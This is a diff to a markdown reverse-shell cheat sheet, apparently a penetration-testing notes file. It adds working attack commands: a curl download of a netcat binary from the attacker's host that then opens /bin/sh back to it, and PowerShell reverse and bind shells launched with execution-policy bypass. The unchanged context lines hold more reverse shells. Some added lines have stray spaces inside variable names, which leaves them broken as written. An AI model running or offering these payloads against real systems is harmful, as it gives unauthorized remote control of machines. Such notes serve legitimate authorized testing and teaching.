@@ -6,6 +6,9 @@
 nc -lvnp $source_port
 ```
 ```bash
+rlwrap nc -lvnp $source_port
+```
+```bash
 socat file:tty,raw,echo=0 tcp-listen:$source_port
 ```
 
@@ -33,16 +36,31 @@ rm -f /tmp/p; mknod /tmp/p p && nc $source_ip $source_port 0/tmp/p
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet $source_ip $source_port 0/tmp/p
 ```
+```bash
+curl http://$source_ip/tools_linux/nc -o /tmp/nc
+chmod +x /tmp/nc 
+/tmp/nc $source_ip $source_port -e /bin/sh
+```
 
 ### Windows 
 ```bash
 //$source_ip/$smb_share/lists/static-binaries/binaries/windows/x86/ncat.exe $source_ip $source_port  --ssl -e cmd -v 
 ```
+
+#### Reverse Shell
 ```powershell
 New-Object System.Net.Sockets.TCPClient("$source_ip",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 ```bash
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object "System.Net.Sockets.TCPClient(\"$source_ip\",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+```bash
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"$source_ip\",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
+```
+
+#### Bind Shell
+```bash
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$source_port);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"
 ```
 
 ### ncat
@@ -105,6 +123,7 @@ ruby -rsocket -e 'c=TCPSocket.new("$source_ip","$source_port");while(cmd=c.gets)
 
 ## Upgrade Your Shell
 ```bash
+export TERM=xterm-256color
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 Enter ctl+z in terminal that is running reverse shell"
